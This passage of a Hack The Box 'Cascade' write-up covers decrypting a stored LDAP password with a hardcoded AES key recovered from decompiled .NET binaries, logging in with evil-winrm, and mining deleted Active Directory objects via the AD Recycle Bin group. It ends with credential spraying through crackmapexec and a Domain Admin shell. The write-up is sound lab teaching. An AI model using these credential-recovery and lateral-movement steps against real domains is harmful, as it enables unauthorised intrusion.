+<span class="n">sqlite</span><span class="o">&gt;</span>
+</pre></table></code></div></div><p>First I dumped the <code class="language-plaintext highlighter-rouge">DeletedUserAudit</code> table, which revealed that the user <code class="language-plaintext highlighter-rouge">TempAdmin</code> I had been looking for had been deleted! Perhaps I could find some remnants of that user which would give me his admin credentials. I dumped the <code class="language-plaintext highlighter-rouge">Ldap</code> table of this database, which gave me only a few queries including the line <code class="language-plaintext highlighter-rouge">INSERT INTO Ldap VALUES(1,'ArkSvc','BQO5l5Kj9MdErXx6Q6AGOw==','cascade.local');</code> which looked like it contained a password for the <code class="language-plaintext highlighter-rouge">ArkScv</code> user that I was hoping to move laterally into. Now I had to figure out what kind of encryption it was stored with (it wasn’t simple base64 unfortunately).</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/4-encryption-code%20%281%29%20%281%29.png" alt="" /></p><p>Since I had noticed that <code class="language-plaintext highlighter-rouge">CascAudit.exe</code> interacted with the database file, I was fairly certain that it had something to do with the encryption. The file <code class="language-plaintext highlighter-rouge">CascCrypto.dll</code> in the same folder strengthened my suspicions. I loaded each of those files in <a href="https://github.com/icsharpcode/AvaloniaILSpy">ILSpy</a> hoping that they had been compiled with .NET. Luckily for me they had, and I was presented with the source code for the files. I very quickly spotted the line<code class="language-plaintext highlighter-rouge">password = Crypto.DecryptString(encryptedString, "c4scadek3y654321");</code> which pointed me to both the decryption method and also what was most likely a hardcoded encryption key.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/4-casc_crypto.png" alt="" /></p><p>I copied the decryption method from <code class="language-plaintext highlighter-rouge">CascCrypto.dll</code> and the encryption key from the executable then loaded the code into <a href="https://dotnetfiddle.net">dotnetfiddle.net</a> where I could compile and run it.</p><p>If I hadn’t been comfortable with writing a tiny bit of C# to get the code to run, all of the information needed to use other methods is contained in the code. The encryption algorithm is AES in CBC mode with a key and block size of 128 bits, and an IV of 1tdyjCbY1lx49842. Taking this information with the known ciphertext and encryption key, I could have used any number of programming or scripting languages, or even websites to decrypt the password (such as one of my favorite sites for deciphering and decoding: <a href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a>).</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/5-decrypted.png" alt="" /></p><p>After a little bit of work to make the code function as a stand-alone program, it gave me the password <code class="language-plaintext highlighter-rouge">w3lc0meFr31nd</code>. <em>I’m not sure what the undecipherable characters are in the output, but luckily leaving them out did not cause any issues with logging in with this password.</em></p><h3 id="moving-laterally-to-arksvc">Moving Laterally to <code class="language-plaintext highlighter-rouge">arksvc</code></h3><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/cascade$ evil-winrm -u arksvc -p w3lc0meFr31nd -i 10.10.10.182
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\arksvc\Documents&gt; whoami /all
+
+USER INFORMATION
+----------------
+
+User Name      SID
+============== ==============================================
+cascade\arksvc S-1-5-21-3332504370-1206983947-1165150453-1106
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                            Attributes
+=========================================== ================ ============================================== ===============================================================
+Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+CASCADE\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
+CASCADE\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
+CASCADE\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group
+CASCADE\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+</pre></table></code></div></div><p>Darn, I expected this user to have <strong>SeBackupPrivilege</strong>. Oh well, so much for the easy win. The group <code class="language-plaintext highlighter-rouge">AD Recycle Bin</code> looked promising, however. I did some research on this group and found a blog that talked about how to exploit it at <a href="https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/">https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/</a>. There was also a bit of interesting trivia included that related to this machine:</p><blockquote><p>The Active Directory Recycle Bin was introduced in the Windows Server 2008 R2 release.</p></blockquote><p>Using the information in the blog, it looked like I could revive the <code class="language-plaintext highlighter-rouge">TempAdmin</code> account that I had seen when I enumerated the database, which had been deleted.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
+</pre></table></code></div></div><p>Running this command from the article returns:</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+</pre><td class="rouge-code"><pre>Deleted           : True
+DistinguishedName : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local
+Name              : CASC-WS1
+                    DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
+ObjectClass       : computer
+ObjectGUID        : 6d97daa4-2e82-4946-a11e-f91fa18bfabe
+
+Deleted           : True
+DistinguishedName : CN=Scheduled Tasks\0ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN=Deleted Objects,DC=cascade,DC=local
+Name              : Scheduled Tasks
+                    DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
+ObjectClass       : group
+ObjectGUID        : 13375728-5ddb-4137-b8b8-b9041d1d3fd2
+
+Deleted           : True
+DistinguishedName : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
+Name              : {A403B701-A528-4685-A816-FDEE32BDDCBA}
+                    DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
+ObjectClass       : groupPolicyContainer
+ObjectGUID        : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
+
+Deleted           : True
+DistinguishedName : CN=Machine\0ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN=Deleted Objects,DC=cascade,DC=local
+Name              : Machine
+                    DEL:93c23674-e411-400b-bb9f-c0340bda5a34
+ObjectClass       : container
+ObjectGUID        : 93c23674-e411-400b-bb9f-c0340bda5a34
+
+Deleted           : True
+DistinguishedName : CN=User\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local
+Name              : User
+                    DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
+ObjectClass       : container
+ObjectGUID        : 746385f2-e3a0-4252-b83a-5a206da0ed88
+
+Deleted           : True
+DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
+Name              : TempAdmin
+                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+ObjectClass       : user
+ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059
+</pre></table></code></div></div><p>There is the <code class="language-plaintext highlighter-rouge">TempAdmin</code> user we were looking for. According to the blog, we can restore it with the command <code class="language-plaintext highlighter-rouge">Restore-ADObject -Identity "&lt;ObjectGUID&gt;"</code>.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Program Files (x86)&gt; Restore-ADObject -Identity "f0cc344d-31e0-4866-bceb-a842791ca059"
+Insufficient access rights to perform the operation
+At line:1 char:1
++ Restore-ADObject -Identity "f0cc344d-31e0-4866-bceb-a842791ca059"
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (CN=TempAdmin\0A...ascade,DC=local:ADObject) [Restore-ADObject], ADException
+    + FullyQualifiedErrorId : 0,Microsoft.ActiveDirectory.Management.Commands.RestoreADObject
+</pre></table></code></div></div><p>Well that looks like a bust…I wonder what else can <code class="language-plaintext highlighter-rouge">arksvc</code> do with a deleted account? I tried trimming down the command to see how different the output was.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Program Files (x86)&gt; Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
+
+--snipped--
+CanonicalName                   : cascade.local/Deleted Objects/User
+                                  DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
+CN                              : User
+                                  DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
+Created                         : 1/26/2020 2:34:31 AM
+createTimeStamp                 : 1/26/2020 2:34:31 AM
+Deleted                         : True
+Description                     :
+DisplayName                     :
+DistinguishedName               : CN=User\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local
+dSCorePropagationData           : {1/1/1601 12:00:00 AM}
+instanceType                    : 4
+isDeleted                       : True
+LastKnownParent                 : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
+Modified                        : 1/26/2020 2:40:52 AM
+modifyTimeStamp                 : 1/26/2020 2:40:52 AM
+msDS-LastKnownRDN               : User
+Name                            : User
+                                  DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
+nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                  :
+ObjectClass                     : container
+ObjectGUID                      : 746385f2-e3a0-4252-b83a-5a206da0ed88
+ProtectedFromAccidentalDeletion : False
+sDRightsEffective               : 0
+showInAdvancedViewOnly          : True
+uSNChanged                      : 196700
+uSNCreated                      : 196690
+whenChanged                     : 1/26/2020 2:40:52 AM
+whenCreated                     : 1/26/2020 2:34:31 AM
+
+accountExpires                  : 9223372036854775807
+badPasswordTime                 : 0
+badPwdCount                     : 0
+CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
+                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
+CN                              : TempAdmin
+                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+codePage                        : 0
+countryCode                     : 0
+Created                         : 1/27/2020 3:23:08 AM
+createTimeStamp                 : 1/27/2020 3:23:08 AM
+Deleted                         : True
+Description                     :
+DisplayName                     : TempAdmin
+DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
+dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
+givenName                       : TempAdmin
+instanceType                    : 4
+isDeleted                       : True
+LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
+lastLogoff                      : 0
+lastLogon                       : 0
+logonCount                      : 0
+Modified                        : 1/27/2020 3:24:34 AM
+modifyTimeStamp                 : 1/27/2020 3:24:34 AM
+msDS-LastKnownRDN               : TempAdmin
+Name                            : TempAdmin
+                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                  :
+ObjectClass                     : user
+ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
+objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
+primaryGroupID                  : 513
+ProtectedFromAccidentalDeletion : False
+pwdLastSet                      : 132245689883479503
+sAMAccountName                  : TempAdmin
+sDRightsEffective               : 0
+userAccountControl              : 66048
+userPrincipalName               : TempAdmin@cascade.local
+uSNChanged                      : 237705
+uSNCreated                      : 237695
+whenChanged                     : 1/27/2020 3:24:34 AM
+whenCreated                     : 1/27/2020 3:23:08 AM
+</pre></table></code></div></div><p>For a deleted account there was sure a lot of information still stored! There were a few other deleted objects, but the additional information included in the <code class="language-plaintext highlighter-rouge">TempAdmin</code> object gave me everything I needed. There was another base64 encoded <strong>CascLegacyPwd</strong>.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/cascade$ echo YmFDVDNyMWFOMDBkbGVz | base64 -d
+baCT3r1aN00dles
+</pre></table></code></div></div><p>Decoding the base64 string <code class="language-plaintext highlighter-rouge">YmFDVDNyMWFOMDBkbGVz</code> gave me the password <code class="language-plaintext highlighter-rouge">baCT3r1aN00dles</code>.</p><h2 id="getting-an-administrator-shell"><strong>Getting an Administrator shell</strong></h2><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/cascade$ crackmapexec winrm -u users -p passwords -d Cascade 10.10.10.182
+WINRM       10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
+WINRM       10.10.10.182    5985   CASC-DC1         [-] Cascade\Administrator:rY4n5eva "the specified credentials were rejected by the server"
+WINRM       10.10.10.182    5985   CASC-DC1         [-] Cascade\Administrator:sT333ve2 "the specified credentials were rejected by the server"
+WINRM       10.10.10.182    5985   CASC-DC1         [-] Cascade\Administrator:w3lc0meFr31nd "the specified credentials were rejected by the server"
+WINRM       10.10.10.182    5985   CASC-DC1         [+] Cascade\Administrator:baCT3r1aN00dles (Pwn3d!)
+</pre></table></code></div></div><p><em>Pwn3d!</em></p><h3 id="roottxt"><strong>Root.txt</strong></h3><p>After getting the password for <code class="language-plaintext highlighter-rouge">TempAdmin</code>, <em>**</em>which I had read earlier was the same as the normal Administrator account, I was able to finally login to an Administrator shell and gather up my hard-earned loot.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/cascade$ evil-winrm -u Administrator -p baCT3r1aN00dles -i 10.10.10.182
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ../Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; ls
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        7/26/2020   8:56 AM             34 root.txt
+-a----        3/25/2020  11:17 AM           1031 WinDirStat.lnk
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
+c819f64119a10a2aa646d6883796d488
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; whoami /all
+
+USER INFORMATION
+----------------
+
+User Name             SID
+===================== =============================================
+cascade\administrator S-1-5-21-3332504370-1206983947-1165150453-500
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                     Type             SID                                            Attributes
+============================================== ================ ============================================== ===============================================================
+Everyone                                       Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Administrators                         Alias            S-1-5-32-544                                   Mandatory group, Enabled by default, Enabled group, Group owner
+BUILTIN\Users                                  Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access     Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                           Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users               Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization                 Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+CASCADE\Domain Admins                          Group            S-1-5-21-3332504370-1206983947-1165150453-512  Mandatory group, Enabled by default, Enabled group
+CASCADE\Group Policy Creator Owners            Group            S-1-5-21-3332504370-1206983947-1165150453-520  Mandatory group, Enabled by default, Enabled group
+CASCADE\Schema Admins                          Group            S-1-5-21-3332504370-1206983947-1165150453-518  Mandatory group, Enabled by default, Enabled group
+CASCADE\Enterprise Admins                      Group            S-1-5-21-3332504370-1206983947-1165150453-519  Mandatory group, Enabled by default, Enabled group
+CASCADE\Data Share                             Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
+CASCADE\Denied RODC Password Replication Group Alias            S-1-5-21-3332504370-1206983947-1165150453-572  Mandatory group, Enabled by default, Enabled group, Local Group
+NT AUTHORITY\NTLM Authentication               Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level           Label            S-1-16-12288
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                  Description                                                    State
+=============================== ============================================================== =======
+SeIncreaseQuotaPrivilege        Adjust memory quotas for a process                             Enabled
+SeMachineAccountPrivilege       Add workstations to domain                                     Enabled
+SeSecurityPrivilege             Manage auditing and security log                               Enabled
+SeTakeOwnershipPrivilege        Take ownership of files or other objects                       Enabled
+SeLoadDriverPrivilege           Load and unload device drivers                                 Enabled
+SeSystemProfilePrivilege        Profile system performance                                     Enabled
+SeSystemtimePrivilege           Change the system time                                         Enabled
+SeProfileSingleProcessPrivilege Profile single process                                         Enabled
+SeIncreaseBasePriorityPrivilege Increase scheduling priority                                   Enabled
+SeCreatePagefilePrivilege       Create a pagefile                                              Enabled
+SeBackupPrivilege               Back up files and directories                                  Enabled
+SeRestorePrivilege              Restore files and directories                                  Enabled
+SeShutdownPrivilege             Shut down the system                                           Enabled
+SeDebugPrivilege                Debug programs                                                 Enabled
+SeSystemEnvironmentPrivilege    Modify firmware environment values                             Enabled
+SeChangeNotifyPrivilege         Bypass traverse checking                                       Enabled
+SeRemoteShutdownPrivilege       Force shutdown from a remote system                            Enabled
+SeUndockPrivilege               Remove computer from docking station                           Enabled
+SeEnableDelegationPrivilege     Enable computer and user accounts to be trusted for delegation Enabled
+SeManageVolumePrivilege         Perform volume maintenance tasks                               Enabled
+SeImpersonatePrivilege          Impersonate a client after authentication                      Enabled
+SeCreateGlobalPrivilege         Create global objects                                          Enabled
+SeIncreaseWorkingSetPrivilege   Increase a process working set                                 Enabled
+SeTimeZonePrivilege             Change the time zone                                           Enabled
+SeCreateSymbolicLinkPrivilege   Create symbolic links                                          Enabled
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt;
+</pre></table></code></div></div><p>Woot! Domain Admin!</p><p>Thanks to <a href="https://www.hackthebox.eu/home/users/profile/158833"><code class="language-plaintext highlighter-rouge">Vbscrub</code></a> for this machine which was fairly easy, but had some interesting takes on old methods and also included some things which were new to me. Easy challenges should never be beneath you, because each one is a validation of how much you have learned!</p><p>If you have comments, issues, or other feedback, or have any other fun or useful tips or tricks to share, feel free to contact me on Github at <a href="https://github.com/zweilosec">https://github.com/zweilosec</a> or in the comments below!</p><p>If you like this content and would like to see more, please consider buying me a coffee! <a href="https://www.buymeacoffee.com/zweilosec"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&amp;emoji=&amp;slug=zweilosec&amp;button_colour=FFDD00&amp;font_colour=000000&amp;font_family=Lato&amp;outline_colour=000000&amp;coffee_colour=ffffff" /></a></p></div><script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="If you like this content and would like to see more, please consider buying me a coffee!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack the Box</a>, <a href='/categories/writeup/'>Writeup</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a> <a href="/tags/hacking/" class="post-tag no-text-decoration" >hacking</a> <a href="/tags/hack-the-box/" class="post-tag no-text-decoration" >hack the box</a> <a href="/tags/redteam/" class="post-tag no-text-decoration" >redteam</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a> <a href="/tags/smb/" class="post-tag no-text-decoration" >smb</a> <a href="/tags/sql/" class="post-tag no-text-decoration" >sql</a> <a href="/tags/metasploit/" class="post-tag no-text-decoration" >metasploit</a> <a href="/tags/ldap/" class="post-tag no-text-decoration" >ldap</a> <a href="/tags/kerberos/" class="post-tag no-text-decoration" >kerberos</a> <a href="/tags/vnc/" class="post-tag no-text-decoration" >vnc</a> <a href="/tags/net/" class="post-tag no-text-decoration" >.net</a> <a href="/tags/active-directory/" class="post-tag no-text-decoration" >active directory</a> <a href="/tags/powershell/" class="post-tag no-text-decoration" >powershell</a> <a href="/tags/oscp/" class="post-tag no-text-decoration" >oscp</a> <a href="/tags/tj-null/" class="post-tag no-text-decoration" >tj_null</a> <a href="/tags/medium/" class="post-tag no-text-decoration" >medium</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/vbscrub/" class="post-tag no-text-decoration" >vbscrub</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack the Box - Cascade Writeup - Hacker's Rest&url=https://zweilosec.github.io/posts/cascade/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack the Box - Cascade Writeup - Hacker's Rest&u=https://zweilosec.github.io/posts/cascade/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack the Box - Cascade Writeup - Hacker's Rest&url=https://zweilosec.github.io/posts/cascade/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/upgrade-linux-shell/">Upgrade a linux reverse shell to a fully usable TTY shell</a><li><a href="/posts/late/">Hack The Box - Late Writeup</a><li><a href="/posts/acute/">Hack The Box - Acute Writeup</a><li><a href="/posts/jekyll-chirpy-github-pages-blog/">How to use GitHub Pages to host a blog with Jekyll Chirpy theme</a><li><a href="/posts/zip-unzip-files-powershell/">How to Zip and Unzip Files Using PowerShell</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/hack-the-box/">hack the box</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/unfinished/">unfinished</a> <a class="post-tag" href="/tags/oscp/">oscp</a> <a class="post-tag" href="/tags/tj-null/">tj_null</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <script src="https://utteranc.es/client.js" repo="zweilosec/zweilosec.github.io" issue-term="title" label="comments 💬" theme="github-dark" crossorigin="anonymous" async> </script><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/blunder/"><div class="card-body"> <span class="timeago small" > Jun 9, 2020 <i class="unloaded">2020-06-09T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Blunder Writeup</h3><div class="text-muted small"><p> HTB - Blunder Overview This easy difficulty Linux machine featured a content management system that was new to me, and a simple to use but interesting way to bypass a common configuration used ...</p></div></div></a></div><div class="card"> <a href="/posts/magic/"><div class="card-body"> <span class="timeago small" > Aug 4, 2020 <i class="unloaded">2020-08-04T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Magic Writeup</h3><div class="text-muted small"><p> HTB - Magic Overview This machine is on TJ_Null’s list of OSCP-like machines. Have fun! Short description to include any strange things to be dealt with Useful Skills and Tools descriptio...</p></div></div></a></div><div class="card"> <a href="/posts/admirer/"><div class="card-body"> <span class="timeago small" > Aug 6, 2020 <i class="unloaded">2020-08-06T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Admirer Writeup</h3><div class="text-muted small"><p> HTB - Admirer Overview An easy difficulty Linux machine that has an interesting take on database manipulation to obtain a local file inclusion vulnerability. It also has an interesting new (to...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/multimaster/" class="btn btn-outline-primary" prompt="Older"><p>Hack the Box - Multimaster Writeup</p></a> <a href="/posts/magic/" class="btn btn-outline-primary" prompt="Newer"><p>Hack the Box - Magic Writeup</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/zweilosec">zweilosec</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by 